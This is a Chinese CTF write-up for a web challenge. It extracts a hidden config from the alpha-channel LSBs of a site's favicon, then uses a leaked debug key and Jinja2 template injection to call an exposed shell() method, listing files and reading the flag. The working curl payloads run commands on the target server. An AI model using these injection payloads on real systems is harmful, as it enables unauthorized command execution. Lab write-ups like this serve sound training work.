---
title: Alpha Layers WP - Web夹杂MISC
description: 一流网安学院建设：Web安全挑战赛
author: lamaper
date: 2026-04-01 12:54:21 +0800
categories: [Cyber Security]
tags: [ctf, web, python, flask, jinja2, SSTI]
math: true
mermaid: true
toc: true
---

# Alpha Layers WP

题目给了一个重建后的官网地址，并提示“真正的线索不在显眼的交互层里，而是被故意塞进了不会被认真看第二眼的公开文件”。这个描述本身就在提示我们不要只盯着首页按钮、表单和普通链接，而要回头检查那些通常不会被仔细看的公开静态资源。

先访问首页，确认站点大致结构。

```bash
curl -i -sS http://106.55.228.147:18080/
```

返回的是一个完整的静态模板站首页，里面没有直接暴露可疑入口，但能看到页面固定引用了一个旧资源：

```html
<link rel="icon" href="/favicon.ico">
```

接着检查 `robots.txt`，因为这类题里它经常会给出第一层提示。

```bash
curl -i -sS http://106.55.228.147:18080/robots.txt
```

返回内容非常短：

```text
Abnormal favicon.ico
```

这里已经很明确了，题目要我们重点看 `/favicon.ico`。于是直接抓取这个文件。

```bash
curl -i -sS http://106.55.228.147:18080/favicon.ico -o favicon.ico
```

因为我保存时用了 `-i`，本地文件里会带 HTTP 响应头，所以先把响应体剥离出来。

```python
from pathlib import Path
data = Path('favicon.ico').read_bytes()
sep = data.find(b'\r\n\r\n')
body = data[sep+4:] if sep != -1 else data
Path('favicon.body').write_bytes(body)
print(len(body))
```

用 `file` 看一下真实类型：

```bash
file favicon.body
```

输出说明它不是普通 ICO，而是“ICO 容器里嵌了 PNG”：

```text
MS Windows icon resource - 1 icon, ... with PNG image data
```

再看文件头：

```bash
xxd -g 1 -l 64 favicon.body
```

能看到 ICO 头后面紧跟着 PNG 魔数。于是把其中的 PNG 单独切出来：

```python
from pathlib import Path
ico = Path('favicon.body').read_bytes()
png = ico[22:]
Path('favicon.png').write_bytes(png)
print(len(png))
```

为了确认有没有 PNG 尾随数据或者多余分块，再做一次简单分块解析：

```python
from pathlib import Path
png = Path('favicon.png').read_bytes()
pos = 8
while pos + 12 <= len(png):
    length = int.from_bytes(png[pos:pos+4], 'big')
    ctype = png[pos+4:pos+8].decode()
    print(ctype, length, pos)
    pos += 12 + length
    if ctype == 'IEND':
        break
print('end=', pos, 'total=', len(png), 'trailing=', len(png)-pos)
```

结果显示 PNG 结构很干净，没有在 `IEND` 之后直接追加别的压缩包或文本。那下一步就该怀疑隐写，尤其是题目描述里的“被故意塞进公开文件”和 `robots.txt` 对 favicon 的点名，都很像把信息藏进图像像素。

我先直接看图，能看到一个非常淡的电路板图标，但肉眼没有文字。于是开始检查位平面，尤其是 alpha 通道最低位，因为提示里“Transparent pixels still carry data”这类话很常见。

解出 PNG 像素，把 RGBA 各通道的 bit plane 导出成图：

```python
import zlib
from pathlib import Path

png = Path('favicon.png').read_bytes()
w = int.from_bytes(png[16:20], 'big')
h = int.from_bytes(png[20:24], 'big')

pos = 8
idata = b''
while pos + 12 <= len(png):
    l = int.from_bytes(png[pos:pos+4], 'big')
    t = png[pos+4:pos+8]
    d = png[pos+8:pos+8+l]
    pos += 12 + l
    if t == b'IDAT':
        idata += d
    if t == b'IEND':
        break

raw = zlib.decompress(idata)
stride = w * 4 + 1
pixels = b''.join(raw[i*stride+1:(i+1)*stride] for i in range(h))

def bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits) - len(bits) % 8, 8):
        v = 0
        for b in bits[i:i+8]:
            v = (v << 1) | b
        out.append(v)
    return bytes(out)

vals = [pixels[i+3] for i in range(0, len(pixels), 4)]   # alpha channel
bits = [(v >> 0) & 1 for v in vals]                       # alpha LSB
data = bits_to_bytes(bits)
Path('alpha_lsb.bin').write_bytes(data)
print(data[:400].decode('latin1', errors='ignore'))
```

这一步直接打出了隐藏数据：

```javascript
window.__ALPHA_LAYERS__ = Object.freeze({
  channel: "favicon.ico",
  previewEndpoint: "/api/preview",
  previewParams: Object.freeze({
    template: "cmd",
    name: "name"
  }),
  debugKey: "06283b8579fa0f3b4914efc11b1c5491",
  sample: "/api/preview?name=guest&cmd={{7*7}}",
  note: "Transparent pixels still carry data."
});
```

到这里，第二入口已经拿到了：

`/api/preview`

而且还给出了鉴权用的 `debugKey`，以及一个典型的 Jinja 风格样例 `{{7*7}}`。

先直接访问接口，不带 key 看看行为：

```bash
curl -i -sS 'http://106.55.228.147:18080/api/preview'
```

返回：

```json
{
  "ok": false,
  "error": "preview mode disabled"
}
```

再按隐藏配置里的方式，加上请求头 `X-Debug-Key`：

```bash
curl -i -sS \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  'http://106.55.228.147:18080/api/preview?name=guest&cmd=%7B%7B7*7%7D%7D'
```

返回：

```json
{
  "ok": true,
  "preview": "49",
  "debug": {
    "name": "guest",
    "templateLength": 7,
    "engine": "shell"
  }
}
```

这说明接口会把 `cmd` 当模板渲染。继续探测后，能确认这是一个被限制过的 Jinja sandbox。此时最容易想到的是走传统 SSTI 链，但题目真正的突破点不是强行逃 Jinja，而是模板上下文本身就暴露了危险对象。

我先用 `is defined` 探测模板里哪些变量存在：

```python
import urllib.parse, subprocess, json
names = ['self','name','range','dict','title','brand','theme']
base = 'http://106.55.228.147:18080/api/preview?name=guest&cmd='
for n in names:
    payload = '{{ ' + n + ' is defined }}'
    url = base + urllib.parse.quote(payload, safe='')
    out = subprocess.check_output([
        'curl','-sS','--retry','8','--retry-delay','1',
        '-H','X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491',
        url
    ], text=True)
    j = json.loads(out)
    print(n, '=>', j.get('preview') or j.get('error'))
```

这里可以看到 `theme` 是存在的。于是直接输出它的值：

```bash
curl -sS \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  'http://106.55.228.147:18080/api/preview?name=guest&cmd=%7B%7Btheme%7D%7D'
```

返回：

```text
ThemeRuntime(actions=meta,shell,mode=unrestricted)
```

这就是关键。上下文里挂了一个应用自定义对象 `ThemeRuntime`，而且名字里已经直接告诉我们它有两个可用动作：`meta` 和 `shell`。

先调用 `meta()` 确认运行环境：

```bash
curl -sS -G \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  --data-urlencode 'name=meta' \
  --data-urlencode "cmd={{theme|attr(name)()}}" \
  'http://106.55.228.147:18080/api/preview'
```

返回：

```json
{
  "ok": true,
  "preview": "{\"actions\": [\"meta\", \"shell\"], \"mode\": \"unrestricted\", \"cwd\": \"/app\"}"
}
```

这里已经非常直白了，`mode=unrestricted`，而且工作目录在 `/app`。接着测试 `shell()`，看它是不是直接能执行命令：

```bash
curl -sS -G \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  --data-urlencode 'name=shell' \
  --data-urlencode "cmd={{theme|attr(name)('pwd')}}" \
  'http://106.55.228.147:18080/api/preview'
```

返回：

```json
{
  "ok": true,
  "preview": "/app"
}
```

说明 `theme.shell(command_line)` 就是一个直接命令执行面。到这里题目已经结束了，后面只是定位目标文件。

先列目录：

```bash
curl -sS -G \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  --data-urlencode 'name=shell' \
  --data-urlencode "cmd={{theme|attr(name)('ls -la /app')}}" \
  'http://106.55.228.147:18080/api/preview'
```

能看到：

```text
/app/app.py
/app/runtime
/app/settings.py
/app/static
/app/stego.py
```

再递归列一下文件：

```bash
curl -sS -G \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  --data-urlencode 'name=shell' \
  --data-urlencode "cmd={{theme|attr(name)('find /app -maxdepth 2 -type f | sort')}}" \
  'http://106.55.228.147:18080/api/preview'
```

输出里直接出现目标：

```text
/app/runtime/flag.txt
```

```bash
curl -sS -G \
  -H 'X-Debug-Key: 06283b8579fa0f3b4914efc11b1c5491' \
  --data-urlencode 'name=shell' \
  --data-urlencode "cmd={{theme|attr(name)('cat /app/runtime/f*')}}" \
  'http://106.55.228.147:18080/api/preview'
```

得到 flag：

```text
flag{8ea99ac70119aeda526b8f6e35bd8c03}
```
